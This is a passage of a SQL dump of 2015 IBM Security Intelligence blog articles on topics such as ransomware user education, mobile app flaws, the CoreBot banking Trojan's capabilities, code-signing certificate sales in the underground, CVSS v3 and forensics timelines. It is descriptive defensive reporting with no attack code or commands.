fines, but rather long-term oversight from the FTC into the privacy practices of the affected company — a sort of privacy probation with potential for future fines if certain conditions aren’t met. The threat of a layer of oversight similar to “The Bobs” efficiency consultants in “Office Space,” combined with the hard-dollar cost to pay for lawsuits, new security products and credit monitoring for affected customers, may be the incentive needed for companies to bolster their security posture. So, yeah, if they could go ahead and get on that… That’d be great.', '\'Cost of a Data Breach\', \'Cybersecurity\', \'Data Breach\', \'U.S. Securities and Exchange Commission (SEC)\'', 'https://securityintelligence.com/the-myth-of-stock-busting-breaches/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (349, 'Don’t Click on That! Practical User Education for Ransomware and Other Malware', 'Pamela Cobb', '2015-9-14', 'Open up any news feed on the security industry and you’ll read stories on attacks that started with the end user of the affected company. Whether it’s phishing schemes, social engineering or drive-by downloads, there’s no shortage of ways for attackers to compromise the least patchable resource in a company: its employees. When I first read the article on ransomware in the 3Q 2015 edition of the “ ,” I thought of different ways endpoint protection products could guard against ransomware attacks. Then I remembered an incident from a couple years ago when a family member called me in a panic because suddenly an FBI warning popped up on the computer. Anyone who works with computers, especially in the security industry, know how those phone conversations go:  The FBI says I did something illegal but I didn’t do anything! Can you fix it?  Well, did you?  No! Of course not! But now I can’t even find the right cat reaction GIF to post to complain about it.  OK, what was the last website you visited or thing you downloaded?  Uh, I can’t remember.  Mmhmm. What was it?   I don’t want to malign my friends or family, but I am frequently reminded of what it was like to parent toddlers when I’m in the middle of this conversation. Let’s take that approach to   since users, like toddlers, can be quite willful when it comes to what they want. Gone are the days when sites hosting malware were obvious. When so many content application vulnerabilities, drive-by downloads and malicious packages can be delivered without major warning flags to users, vigilance on the sites your users are visiting is imperative. Common sense is often touted as a necessary tool, but we in the security industry have seen varying degrees of success in the application of it. To spell it out a bit more, remind your users to look for these warnings signs: Hopefully your users are not in the habit of opening up emails from unknown recipients and blindly clicking through links. Where it gets tricky is when a known recipient is spoofed in email or social media, lulling users into a sense of safety. Odd behavior from known users can be another warning of stranger danger: Is someone who doesn’t normally request wire transfers in the company now requesting them? Encourage users to validate these appeals in a channel other than the one the request was made in — use texting or instant messaging, a phone call or a visit to the office in person to validate instead of just hitting reply on that email. Referring back to websites that look weird, there are ways to check their legitimacy that require varying levels of user involvement. For less proactive users, IT admins can leverage tools like built-in browser safety measures. Popular browsers have built-in browsing protection that will notify users of suspicious sites, particularly on items like unsigned or mismatched SSL certificates. Safe browsing software can blacklist entire classifications of sites or give a rating on the site’s safety based on a variety of scoring systems to draw user attention to a potential issue before clicking. Proactive users can take the reins and do their own research on a threat intelligence platform like  , where they can check the rating of URLs or Web applications that seem suspicious. X-Force Exchange has a database of over 25 billion URLs and images to search against and conveniently presents scores with color-coded risk ratings. Even young children can learn red means stop and green means go! Parenting strategies can vary here, so I’m going to sidestep the potential mommy-blog landmine and recommend that consistency across workstations and user behavior will be your friend. It’s much easier to achieve consistency across workstations in term of setup and patching with   solutions, but enforcing consistent user behavior is a tougher nut to crack. One of my teachers was famous for not allowing gum in the classroom unless you brought enough for the entire class. In an age of bring-your-own-device (BYOD) and the disappearing perimeter, now it seems one user can bring gum, another a lollipop and 10 more have a straight-up suitcase full of sugar. Where IT admins can help control the proliferation of these treats is enforcing connection rules to corporate networks. Requiring users to have a base level of enterprise-mandated endpoint protection installed on any device connecting to the corporate network ensures you don’t end up with metaphorical gum in your hair. Running an IT organization is a bit like parenting. You can set up guidelines and instructions, but at the end of the day, you have to send your users out into the world and hope they make good choices. Infections like ransomware or the common cold might happen regardless. If you need help boosting your own user education or recovering from an infection, check with a managed security services provider for their expertise, or explore some of IBM’s  .', '\'Endpoint Protection\', \'Malware\', \'Ransomware\', \'Threat Intelligence\', \'User Education\'', 'https://securityintelligence.com/dont-click-on-that-practical-user-education-for-ransomware-and-other-malware/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (350, 'Common Mobile App Vulnerabilities You May Be Overlooking', 'Kevin Beaver', '2015-9-11', 'With mobile apps so pervasive in the enterprise, it’s surprising to see the minimal effort put into finding and resolving common  . It’s yet another cog in the wheel of information systems complexity that so many struggle with, despite the fact that mobile apps used for business can introduce an enormous amount of security risks. Be it an internally developed corporate app, a third-party app used by your employees for specific business workflows or something in between, it probably has vulnerabilities. The following are common mobile app security flaws I often come across that you need to be on the lookout for: These are just a few examples, but the possibilities are endless given the growing complexity of mobile computing and  . Ideally, you’ll want to test for these vulnerabilities as part of your software development life cycle. As for   options, there are mobile app source code analyzers, tools that sandbox the apps to check for flaws and, my favorite, good old-fashioned manual analysis. All three types of tests need to be performed if you wish to uncover everything that matters. If such testing is not an option (i.e., the source code is controlled by a third-party developer or vendor), then ask the outside party for a copy of its latest app security vulnerability assessment and penetration test report. Another consideration to help protect you is to write security requirements — or at least security testing — into your RFPs and contracts related to mobile app development. Even with such potential business risks, I see many organizations that don’t include   in their information security program. Are they seemingly too simple to cause harm? Perhaps it’s because they’re often out of sight, out of mind? Whatever the reason, you have to test the security of your mobile apps before a   is exploited. Someone, somewhere along the supply chain, needs to be responsible. However, it’s ultimately up to you to ensure the testing happens and your mobile app security stays in check. Get started on it now of your own volition before someone else forces you to.', '\'Application Security\', \'Application Security Testing\', \'Mobile\', \'Mobile Security\', \'Vulnerabilities\'', 'https://securityintelligence.com/common-mobile-app-vulnerabilities-you-may-be-overlooking/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (351, 'An Overnight Sensation — CoreBot Returns as a Full-Fledged Financial Malware', 'Limor Kessem', '2015-9-10', 'Just last month, Security Intelligence warned about a new and  , indicating its internal structure suggested a new threat about to evolve. CoreBot’s developers did not wait long. Within a matter of days, new samples of CoreBot, discovered and analyzed by IBM X-Force researchers, revealed that the malware has become a full-fledged banking Trojan — almost overnight. This seemingly quick evolution is most likely due to a longer development and testing phase that just recently ended. What has been added to CoreBot to become a banking Trojan? In short: \n CoreBot now comes with a list of 55 URL triggers that launch it into action. All triggers are online banking sites in the U.S., Canada and the U.K. The triggers include the corporate banking, business banking and private banking pages of 33 target financial institutions. CoreBot’s configuration file appears to be using a trigger format that is very similar to Dyre’s, where not all URLs are very precise. Rather, the triggers are written in regular expressions (RegEx) format, which helps the Trojan fixate on URL patterns and thus target a wider array of financial institutions that use the same electronic banking platforms. With its new theft mechanisms, CoreBot has a new modus operandi. Instead of only stealing stored passwords, it now acts like other banking Trojans such as Zeus, Dyre and Dridex: In its previous version, CoreBot was only defined as an information stealer because it did not possess the capabilities that would enable it to steal username and password combinations in real time from the victim’s browser. This has changed, and CoreBot now hooks the three most popular browsers — Google Chrome, Mozilla Firefox and Internet Explorer — to be able to monitor browsing, steal data and apply webinjections. Some of CoreBot’s hooks are: – WS2_32!closesocket – WS2_32!connect (+0xcd1) – WS2_32!WSASend (+0x1fe9) – WS2_32!WSAConnect (+0x52f4) – WS2_32!WSAConnectByList (+0xf5cd) – WS2_32!WSAConnectByNameW (+0x552) – WS2_32!WSAConnectByNameA (+0x387) – CRYPT32!CertGetCertificateChain – CRYPT32!CertVerifyCertificateChainPolicy (+0x21df) – mswsock!MSAFD_ConnectEx – nss3!CERT_VerifyCertificate – CRYPT32!CertGetCertificateChain – WS2_32!closesocket – WS2_32!WSASend (+0x1fe9) – WS2_32!WSAConnect (+0x52f4) – WS2_32!send (+0x92d) – WS2_32!WSAConnectByList (+0xf5cd) – WS2_32!WSAConnectByNameW (+0x552) – WS2_32!WSAConnectByNameA (+0x387) – WS2_32!closesocket – WS2_32!connect (+0xcd1) – WS2_32!WSASend (+0x1fe9) – WS2_32!WSAConnect (+0x52f4) – WS2_32!send (+0x92d) – WS2_32!WSAConnectByList (+0xf5cd) – WS2_32!WSAConnectByNameW (+0x552) – WS2_32!WSAConnectByNameA (+0x387) – CRYPT32!CertGetCertificateChain – CRYPT32!CertVerifyCertificateChainPolicy (+0x21df) Since it has the relevant browser’s functions hooked, CoreBot can begin grabbing form data sent in HTTP requests. The Trojan waits for the victim to hit the login button and steals the entire HTTP post request, similar to the way the Dyre Trojan grabs the same data. The request contains the URL from which it was stolen, the username and password entered by the victim, the victim’s user agent string and some parameters the Trojan transmits to its operator about cookies. This grabbing is generic in nature, hence it steals any authentication credentials entered on the browser. These include access to banks and any other Web resources the victim might access (webmail, online wallets and social networks, to name a few). CoreBot’s modular structure was constructed with additional plugins in mind. After the first stealer plugin for the theft of stored passwords, CoreBot now has a new MitM plugin, named  . CoreBot’s operator uses this capability to take over post-login online banking session. In order to be online at the same time as the victim, CoreBot’s operators use a manual MitM attack scenario. They have programmed the malware to alert them with an instant message as soon as a specific bot comes online so that they can be ready to take the session over. Along with CoreBot’s alert, the malware counts the number of times the same bot initiated a banking session and presents the new total to the fraudster. For example:  This alert to the fraudster is part of a familiar manual MitM attack scenario used often in previous years when account takeover became more challenging. When blocked by detection that relied on IP addresses, device ID, user agent strings or device fingerprints, fraudsters opted for this manual intervention in order to attempt fraud from the original device. It is still used today by fraudsters to bypass device-based security. \n VNC is a popular Trojan plugin, and CoreBot now possesses one of its own. While VNC is not inherently malicious, many fraudsters use these graphical desktop sharing systems to remotely control infected endpoints and abuse them for spam, proxying Web traffic and fraudulent transactions. CoreBot uses a   called hVNC as a plugin to remotely control endpoints while remaining invisible to the user. This module was allegedly created by the Zeus Trojan’s author, used by the Carberp Trojan, as well. The Hidden VNC opens another instance of the desktop, where the fraudster can move around freely yet be on the same device as the victim. In CoreBot’s case, it appears that the VNC is also used to take over the webcam, but the meaning of “webcam” in this sense is not entirely clear. This could either mean the fraudster is checking if the victim is on the PC via the webcam, which is something remote-access tool (RAT) malware like BlackShades was infamous for. Or it could relate to a cam that records videos of the desktop in the same manner the   gang did in order to get familiar with more banking systems through watching victims operate them. CoreBot contains triggers that launch webinjections of social engineering content to harvest data from the victim in order to conduct fraudulent transactions. The injection mechanism itself was surprisingly not borrowed from other malware, but is custom-made code that CoreBot’s author programmed. Beyond the more typical injections designed for credential theft from infected customers of each targeted bank, CoreBot has a more intent focus on five major Canadian banks. In the case of these banks, CoreBot activates on-the-fly injections that are not saved locally in the configuration file, fetching them from a remote webinjection server. This method is considered more advanced, and it is used today by malware like  ,   and Dridex, for example. The purpose of a just-in-time injection is to conceal it from the eyes of security researchers, to quickly switch the injection when banks change the transaction authorization challenges they present customers with and to interact with victims more effectively in real time. After the changes CoreBot has seen of late, this malware should be considered a banking Trojan like any other. While it is not as widely distributed as other malware of this sort, it is only a matter of time before it starts appearing in malware campaigns designed to infect users in its target geographies. Another point to keep in mind is that CoreBot is an active project that is in current development. It is likely we may learn more about new capabilities in the coming months and see it targeting other regions around the world. At this time, CoreBot is not being sold in the underground, but that, too, could change. With  , financial organizations benefit from access to a real-time malware intelligence network that provides insight into fraudster techniques and capabilities — like the evolution of CoreBot into a banking Trojan, for example. This global threat intelligence serves as the foundation for IBM Security Trusteer automated threat protection capabilities and is used by IBM Security experts to help develop and deliver new protections for organizations like yours. At IBM, a research and development (R&D) team of security experts scrutinizes threat intelligence as it arrives. IBM Security Trusteer solutions use this intelligence to deliver flexible protection layers that can be rapidly configured and updated by IBM R&D staff. As a result, shortly after new threats emerge or mutate, new protections are automatically deployed back into Trusteer software without any intervention by bank security staff and without any noticeable impact to banking customers. To keep up to date about CoreBot and other malware join the   platform.', '\'Advanced Threats\', \'Banking Trojan\', \'CoreBot\', \'IBM X-Force Research\', \'Malware\', \'Man-in-the-Middle (MitM)\', \'Trojan\', \'X-Force\'', 'https://securityintelligence.com/an-overnight-sensation-corebot-returns-as-a-full-fledged-financial-malware/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (352, 'The Security and Privacy of Wearable Health and Fitness Devices', 'Milan Patel', '2015-9-10', 'The Internet of Things (IoT) cuts a wide swath across the technology landscape. IoT has the potential to radically modify the quality of human life. The dream was articulated as early as 1961 when MIT professor Aaron Fleisher wrote “ .” “The idea that there exists in technology a potential capable of radically modifying the conditions of human existence has made prophecy a matter for general concern,” Fleisher stated. Today, predictions continue to expound on the potential and pitfalls of the IoT. Nowhere is this truer than the use of wearable devices in the   — from the simple fitness trackers for health enthusiasts to smart apparel that helps optimize the performance of athletes to health monitors and medical devices designed for personal and clinical use. This next era of interconnected devices has the potential to radically improve human health and fitness. But the growing list of cybersecurity vulnerabilities in   pose challenging risks to patients whose privacy or health management depends on the proper functioning of these instruments. In June 2015, for example,   reported that attackers compromised medical devices such as blood gas analyzers with malware to gain access to the hospital networks. Often, consumers are unaware of the security and privacy risks that many of these devices pose until after an event creates media waves. They expect the developers to build it right and build it secure; they assume the hospitals or doctor’s offices have the proper security controls to maintain the safety and privacy of their information. For the manufacturers of these devices, the concerns are: Will the devices be hacked and forced to perform outside of design specs? Will a virus infect the device and trigger a malfunction, thereby jeopardizing patient health? Will the data they collect about their customers be hacked and exploited by organized cybercrime gangs? In January 2015, the   issued guidance on privacy and security protection that should be included with the IoT, including  . Addressing the security and privacy concerns associated with the usage of these devices is the key to unleashing the benefits they offer to society. It also requires a disciplined and structured approach that includes the design and development of these devices, manufacturing in a secure ecosystem and then the deployment and management of these devices, the data they produce and the actions this data drives. \n When creating medical devices connected to the IoT, organizations must establish a secure hardware and software development process that includes code management, build management, automated testing, streamlined packaging and software delivery mechanisms. It should include   to identify vulnerabilities as well as security-related testing to identify runtime vulnerabilities. Ensure integrity in the manufacturing and delivery of these devices. Establish a trusted ecosystem of suppliers and partners. Each component supplier should adopt secure design and development process to ensure no unintended malware or security bugs enter the supply chain. A trusted supply chain must include a focus on effective management of design, manufacturing, transportation, fulfillment, import and export, intellectual property management, support and maintenance. Software delivery also applies to device firmware/software updates. As more and more software is running in a wide range of distributed devices, the need to update that software in a secure, timely and cost-effective manner also increases in importance. A secure, verifiable and audited software/firmware update is part of a secure development and deployment process. Deploying these devices in a secure way is just as important as their design. Attention should be paid to device provisioning and authentication. The deployment process should cross-authenticate both the device and the network to ensure it does not transmit confidential information to a ghost network. Similarly strong encryption should be deployed to ensure the integrity and privacy of the data on the device, in the cloud or during transmission from device to cloud. If possible, consumers should be given   and the ability to set up user and usage privileges for their data. For example, they may want to give full viewing rights to their doctors but only reveal a subset of the information to other service providers. They should also be given the option to anonymize their data to further maintain their privacy. All communications channels should be secured such that sensitive information is protected from observation, change or corruption. Validate input and output parameters to ensure that inadvertent command invocation or escalation of privilege is not possible. Utilize authentication and authorization for devices, users and applications that will interact with one another as a part of the entire IoT solution. Mobile security factors into this since many of the user interfaces for health and medical applications will be surfaced via mobile devices. Insert auditing and logging of both successful and unsuccessful requests for processing, and utilize monitoring and alerting technology distributed across the set of computing systems. This implies that there should be some level of audit logging and monitoring devices, networks and the cloud. Also necessary is detection of denial-of-service (DoS) and distributed denial-of-service (DDoS) attacks against devices and the systems that support them. Be attentive to availability and safety. Above all else, the system must be engineered to do no harm as a result of its connectedness. A fail-safe operation — dropping down incapability but bringing the system to a safe state — must be built into the connected device. The future of the health and fitness industry is going to be increasingly intertwined with the growing number of mobile devices connected to the IoT. With proper security, these gadgets can deliver better medical service and reduce the costs of health care, improving quality of life for users. Taking a systemic approach to securing the devices and the data they collect will help keep the criminals at bay and allow society to radically improve its health and fitness.', '\'Cloud Security\', \'Healthcare Industry\', \'Internet of Things (IoT)\', \'Mobile Security\', \'Wearable Devices\'', 'https://securityintelligence.com/the-security-and-privacy-of-wearable-health-and-fitness-devices/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (353, 'Certificates-as-a-Service? Code Signing Certs Become Popular Cybercrime Commodity', 'Limor Kessem', '2015-9-9', 'The fraud underground is a vivid dark market replete with services, commodities and information sharing, providing cybercriminals with just about any help they may need for their misdoings.\n Alongside the usual malware vendors and fraud scam chatter, one recent phenomenon IBM Security X-Force researchers have been tracking is certificates-as-a-service (CaaS). Cybercriminals obtain high-grade code signing certificates from trusted cert authorities and then sell them on demand through   e-commerce sites to anyone who will pay.\n IBM Security X-Force researchers note seeing a considerable hike in the sale of code signing certificates in the underground in the past few months. Further investigation of this phenomenon reveals findings that add to the understanding of why the use of signed malware has increased threefold in the past four years alone. They also provide some best practices on how to check that certificates can be trusted at a time when trust is increasingly fragile.\n Code signing certificates are files containing a digital signature that can be used to sign files such as executables and scripts. Certificates were created to generate trust and validation in software or code that you run on your machine. They are there to indicate:\n Certificates are issued by certification authorities (CAs) and come in different grades according to the entity that issues them. They are granted to identifiable entities, or companies, that generate code, protocols or software, allowing them to sign their code and indicate it is legitimate and original.\n While in the past certificates were issued only to large software vendors, today smaller firms and individual application developers use them, as well.   on the subject show that the sheer number of certificates in circulation has increased from about 20,000 in 2007 to over 150,000 certificates in 2015.\n Some examples of the most well-known CAs that issue certificates are Symantec and WebTrust. These authorities issue Class 1 certificates, which are considered the most trusted. There are also Class 2 CAs that issue certificates for commercial purposes, such as GoDaddy, DigiCert, Comodo, Entrust and others.\n Beyond basic certification, in cases where a heightened level of security is needed, a digital certificate issued by one CA is used to sign the public key for the root certificate of another CA. This is termed cross-certification, and it provides a means to create a chain of trust from a single trusted root CA to multiple other CAs.\n Code signing certificates are the digital equivalent of the shrink-wrap or hologram seal used on real-world software packages to authenticate them as genuine and assure the user they come from the trusted publisher. As such, certificates are checked by the operating system (OS), granting different types of files, drivers and scripts the ability to operate inside the OS.\n Browsers, antivirus engines and other security tools also check new files for a valid certificate before they allow them to install and alert the user if the file is not signed. An unsigned file receives more restrictive treatment on the system in terms of the processes it will be able to automatically carry out.\n Most relevant within the context of malware and threats are code signing certificates for Microsoft Authenticode, which digitally sign 32-bit or 64-bit user modes (.exe, .cab, .dll, .ocx, .msi, .xpi and .xap files) and kernel-mode software.\n It’s probably easy to understand at this point why cybercriminals would want to have a valid certificate to sign malware before delivering it to an endpoint: It is a means of providing malcode with a higher level of trust on a user’s machine or server, helping it evade protection mechanisms it will encounter on its way. Cybercriminals can use certificates to legitimize almost any code they use — and they do.\n Using certificates to sign malcode is routine for those attempting to keep it looking as legitimate as possible, and it is usually done with stolen certificates.\n Some of the most common illicit ways to obtain code signing certificates entail stealing certificates’ private keys using Trojan horses or — the more advanced, sophisticated approach — by attempting to compromise the certificate key builder of software vendors. The latter is of course the rarer option, but it is nonetheless a means for advanced and targeted actors.\n Signed malicious files can be part of complicated operations.   used certificates stolen from Realtek and JMicron, and   abused stolen Foxconn certificates. A high-profile commercial attack used Sony’s certificates to sign the   and then reused it to attack Sony Pictures. Still, in the bulk of cases, signed malware is used in less sophisticated scenarios, like financial cybercrime, which is also the most prevalent attack type that abuses them.\n Some examples where signed financial malware made the rounds include the Cryptowall ransomware that was  ,   spread during the 2014 holiday season and banking Trojans that were   after malware made it into a developer’s endpoint. But perhaps the most interesting example is also the most recent and bigger threat: The Carbanak Trojan gang, a  , just resurfaced with signed malware files! The gang has apparently been able to obtain a certificate issued by a trusted authority with which to sign their malware.\n In January 2015, a   report noted that while researchers detected about 1,500 certificates signing malware back in 2008, they saw four times as many certificates — over 6,000 of them — sign malware in 2014.\n Overall, the signed malware phenomenon relies on the theft of certificates unbeknownst to their rightful owner. They can remain in circulation and be deemed trusted, but only until someone finds that malicious actors are abusing them — which is exactly what happened when X-Force researchers discovered a suspicious certificate being peddled by cybercriminals in the underground.\n Upon the discovery of a seemingly legitimate certificate that was being used by fraudsters, the first logical possibility our researchers thought about was that it was stolen from its rightful owner.\n The code signing certificate was being used as proof of integrity by a dubious vendor selling them to fellow cybercriminals. This was a valid, trusted certificate issued by a Class 2 CA from a well-known commercial vendor. The certificate was fully usable — easy to sign any program or application with.\n \n Seeing as the certificate was indeed valid at the time, the next step was to contact its owner and advise them that it must have been stolen and was being offered up to cybercriminals in the wild.\n Another important step is the disclosure of the problem to the CA that issued the certificate. This ensures the CA looks into the matter and is aware of the potential of theft of a customer’s certificate.\n Since the certificate was in the hands of cybercriminals to resell and use, IBM Security X-Force researchers took on the task of looking up more information about the company it belonged to in order to disclose the issue to other competent responders.\n The certificate indicated that it belonged to a certain small company registered in the U.K. Open source search results brought up the company’s registration number, showing its official address and the fact it has been active for about a year and a half as of July 2015.\n \n The nature of the company’s business was not made public, nor did it show any activity since its incorporation. However, if it is the sort of business that needs digital certificates, then one could assume it most likely sells software or another code-based product.\n \n But searching for a website for the company did not bring up any results, although it has allegedly existed for over two years and, again, sells software of some sort.\n The postal address to communicate with the owner is shared by no less than 928 other companies — a rather peculiar fact based on Google Maps showing that it is physically located in a residential area in a small Scotland town in the Fife district.\n \n Starting to look surprising? Maybe not so much. Seeing as the certificate at hand was being peddled by a fraudster, is it possible that dummy corporations registered by cybercriminals are then used to issue bank accounts, checks and even code signing certificates? The mysterious company in this case could be a front for the purpose of cybercrime.\n Separating legitimate enterprises from dummy companies can be rather difficult because criminals take the necessary steps to appear authentic. For example, a company that operates in a small Scottish town, in the same postal code as 928 other companies, none of which has a website or phone number, may not be flagged as suspicious.\n It is only when one discovers that the company is signing code with a valid certificate but has no other trace or indication of the nature of its business that a red flag is raised. A legitimate organization that sells software of any sort would at least have a website or show activity online linked with its name if it existed.\n After finding the suspicious certificate, X-Force researchers went deeper into the investigation of what turned out to be an increasingly popular trend in the  : the sale of large amounts of code signing certificates to and by cybercriminals.\n As the research progressed, it was insightful to learn that the certificate selling phenomenon has grown considerably, with over a dozen vendors selling certificates in any given venue. Certificates have evolved into a commodity in the underground, sold without limitations to anyone who will pay.\n Looking into a number of sources, IBM Security X-Force researchers provided a rather telling screen capture of one certificate vendor’s website, detailing the offerings he can supply.\n \n In hopes of appearing legitimate to potential buyers or law enforcement, the vendor makes some ridiculous claims, stating that “thanks to active cooperation with the sellers of certificates,” he can provide the lowest prices in the market. But which sellers? And which market? Clearly the cybercrime market that buys the certificates and then resells them for a profit.\n Note that this shop offers a number of types of certificates, including cross-certification. Cross-certifying is used for Kernel-Mode Code Signing — the most privileged level on the OS. Having this level of certificate sold to criminals can easily lead to dangerous situations for the entities they will later target with signed malcode.\n Unlike the correct practice for selling certificates, the vendor only accepts payment in bitcoin — a telling sign that he has no intention of checking whom he sells these certificates to.\n The more interesting points in this vendor’s post appeared in Russian, where he clearly indicated that his certificates are not stolen and are registered to existing persons and companies.\n What person or company would knowingly allow the sale of a digital certificate in their name to cybercriminals? And how come there are so many of them?\n There is no logical way for cybercriminals to manage to steal so many legitimate certificates quickly enough to continuously supply their buyers. Judging by the momentum the certificate market has been gaining in the underground, there has to be a third way that is quickly gaining popularity. When sudden surges arise in the underground, it is almost always the result of fraudsters finding a new way to make a quick buck with little effort.\n The most likely answer here is that the companies for which the plethora of certificates are being issued do not exist. The vendor registers certificates using identity theft and company information that does not belong to him, or maybe sets up dummy corporations — say, 928 of them in one postal code — and then buys certificates in their names.\n The phenomenon of stolen certificates being used to sign malware is one issue that is already preventing OSs and security solutions from being able to completely trust signed files. While certification is a means to increase trust, it is evident that cybercriminals and advanced threat adversaries are abusing this trust to their own advantage.\n More than the theft of certificates, which is eventually discovered and ends in the revocation of the certificate, the phenomenon of criminals buying certificates for fake or unaware companies is a much greater threat. Certificates that are issued to nonexistent entities and then used to sign malware break the basic trust certificates are made for.\n Reporting suspicious certificates to their owner is unlikely to result in revocation. Similarly, reporting them to the issuing CA may not necessarily result in any concrete action to investigate the matter or put an end to it because the company features the information needed to appear real. Even in the face of actual proof that a certificate is being used to sign malicious code, if its owner has checked out as a legitimate organization at the registration phase and the user account is intact, it may not be further examined thereafter.\n While certificates on their own are a proper means to encrypt and sign code, the supporting verification infrastructure that is supposed to provide assurance is lacking. The result is a burgeoning black market for shady certificates, producing chinks in the armor of trust we should grant signed files.\n Trusting code-signed certificates is becoming increasingly risky, requiring added layers of security to protect from the deepest parts of the OS — the kernel — to its user-mode levels. As this threat becomes more appreciable, it calls for new measures of verification that would allow us to keep intruders out while still trusting code from legitimate vendors.\n Here are some tips that can help:', '\'Certificate Authority (CA)\', \'Cybercrime\', \'Dark Web\', \'IBM X-Force Research\', \'Malware\', \'X-Force\'', 'https://securityintelligence.com/certificates-as-a-service-code-signing-certs-become-popular-cybercrime-commodity/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (354, 'Markdown: Designer Vulnerabilities Get a Fresh CVSS v3 Look', 'Pamela Cobb', '2015-9-8', 'When the Common Vulnerability Scoring System (CVSS) was updated to its third version earlier this year by  , one of the major questions was what the impact would be on   that made earlier headlines and whether the hype matched the new scores. The Access Vector has expanded slightly with the addition of the Physical designation, which requires the attacker to physically touch the affected resource or component. This is a nice addition to the previous indicators that focused solely on electronic infiltration via the network stack or adjacent network access. The Physical vector differs from the local option because, although a malicious file could have been executed by a local user, the attacker does not need to be present. A base metric called Scope was added to CVSS v3 to address instances in which a vulnerability impacts a component other than the vulnerable component, such as a vulnerability in a Web server that affects the victim’s Web browsers that connect to it, or a vulnerability that breaks out of the sandbox that helps to contain it to a small set of permissions. If a vulnerability Scope is Unchanged, then the vulnerable component and the affected component are the same; that is, only the vulnerable server is affected. If the scope metric is Changed, then the example is like the one above, where a vulnerable server will also affect the browser. In addition, the Impact vectors were enhanced to account for when sensitive systems or information are affected, such as usernames and passwords being exposed. Impact is broken down into several areas, such as confidentiality, or whether the   can allow an attack to access confidential data through actions like stealing an admin password (scored High) or some restricted data is obtained or the amount of confidential data is limited (scored Medium). Another aspect of Impact is Integrity, or the veracity of data, including modifying files protected by the impacted component. The Availability component of Integrity rates the potential downtime for the affected component; a High rating on Availability means that the attacker can fully deny sustained (while the attack is active) or persistent (even after the attack is complete) use of the affected component. Likewise, a Low rating in Availability means that the component availability will be impacted, but the attacker does not control the impact or the impact is minimally evasive. In the Q3 edition of the “ ,” IBM Security X-Force researchers looked at the 2008 DNS Kaminsky bug to see how the schemata stacked up. For this particular example, because the bug affects a vulnerable DNS server, the scope goes beyond just the DNS server and can make a victim of the end user who connects to the server. Along with the publication of a scoring tool, FIRST provided a   to help the industry understand the impact. Out of a total of 21 examples, two-thirds had their score rise, and half of those had their score rise by more than 1 point on the 10-point scale. Some of those with the biggest raise in score include the Kaminsky bug mentioned above,   (up to 7.5 from 5), Juniper Proxy ARP DoS ( , now up to a 9.8) and a SearchBlox XSS forgery bug ( , now up to 8.8). When Heartbleed hit the scene last year, the outrage over the impact wasn’t reflected in the 5.0 base score, so it’s no surprise that its score, and those of many others, increased. What’s interesting as well are those vulnerabilities whose scores dropped. Most notably, Adobe Acrobat Buffer Overflow ( ) dropped from 9.3 down to a 7.8 due to the limited scope of the vulnerability. The POODLE bug ( ) dropped from 4.3 to 3.1, which is just another indicator that marketing budgets should probably be reserved for vulnerabilities with a 7.5 higher score. \n If you’d like to do a little research yourself, FIRST has provided a   on its website. IBM has adopted the v3 schema for any new vulnerabilities posted in the X-Force Database, available for research through  , our collaborative threat intelligence sharing platform. It’s worth noting that in both the CVE database and IBM X-Force Exchange, vulnerabilities scored before the adoption of the v3 scoring scheme will still reflect the v2 score. Only new vulnerabilities since the adoption of the v3 scheme will show the new score.', '\'Common Vulnerability Scoring System (CVSS)\', \'Domain Name Server (DNS)\', \'IBM X-Force Exchange\', \'Information Sharing\', \'Threat Intelligence\', \'Vulnerabilities\', \'X-Force\'', 'https://securityintelligence.com/markdown-designer-vulnerabilities-get-a-fresh-cvss-v3-look/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (355, 'The Myth of One-Hour Forensics', 'Pamela Cobb', '2015-9-8', 'Remember “ ,” and how successful malware is sneaky and engineered to be well-hidden, like a subtle email with an obfuscated link to a malware download? Unsurprisingly, this sneakiness means it is hard to detect without sophisticated analytics and robust forensics capabilities. This is no one-hour story arc as we’ve all seen in television crime dramas; there are no transparent touch screens and witty one-liners before the first commercial break. I guess you could say our best hope is that the cybercriminals …  … haven’t gone phishing. Last year, the Ponemon Institute, in conjunction with IBM Security, released a   on network forensics investigations that broke down the forensics process into five major steps: detection, escalation, containment, recovery and post-mortem. Unsurprisingly, the detection and recovery phases take up the most time in the investigation — a combined 70 percent of the total — since these phases involve the bulk of the heavy lifting in the investigation. Detection, at 35 percent of the total time, is similar to finding the body and all the evidence. Although on television the body is laid out in the first three-minute opening scene, in real life, security forensics investigators are likely spending a good bit of time trying to figure out if a breach or attack actually happened. In fact, Ponemon reported that only 31 percent of the time did breaches turn out to be real attacks. What a horrible show that would be: You expect to have a crime to solve each week, but only every third episode produced a body and the rest was just forensics investigators drinking coffee while tediously sifting through all possible evidence. Once the figurative body is found in the network, investigators need to trace back what actually happened. There are a number of tools available to help with this, and many organizations use packet captures (PCAP) to aid in the investigations — 69 percent, in fact. The trouble is that this evidence is nearly as fleeting as the villain of the week since full packet capture is only stored on average for 10 days. But more on that later. If a toxicology test is ordered on TV, you can bet the results will be in by the next commercial break. The results are delivered wordlessly to the lead investigator with a meaningful stare and some eyebrow twitches as the analyst withholds the name from the audience for maximum suspense. Frankly, if any security professional attempted to name an attacker only through stares and eyebrow twitches, well… Maybe that’s how we get cybercriminal names like Ch0$3n0ne. In real life, the Ponemon study shows that, from detection to containment for a breach like the one cited above, the average time to complete a forensics investigation is nearly a full week. It’s even longer for an insider attack. Having those 10 days of packet captures from before is plenty of time, then, to completely solve the crime. A different  , though, shows that malware can stay undetected on the network for up to 225 days. Then that initial attack vector is long gone from the 10 days of PCAP storage records. The trick is to detect the crime before that first commercial break — or, in the real world, within days of it happening. The evidence was right in front of you the entire time: Security intelligence is the key. Detection capabilities that gather all the evidence in logs and network flows and focus in on anomalous behavior are necessary to figure out that an attack has occurred. To then decipher the evidence, you can’t rely on the bad guys writing their malware in red while the good, regular code is in green. A good   can retrace the step-by-step actions of attackers and 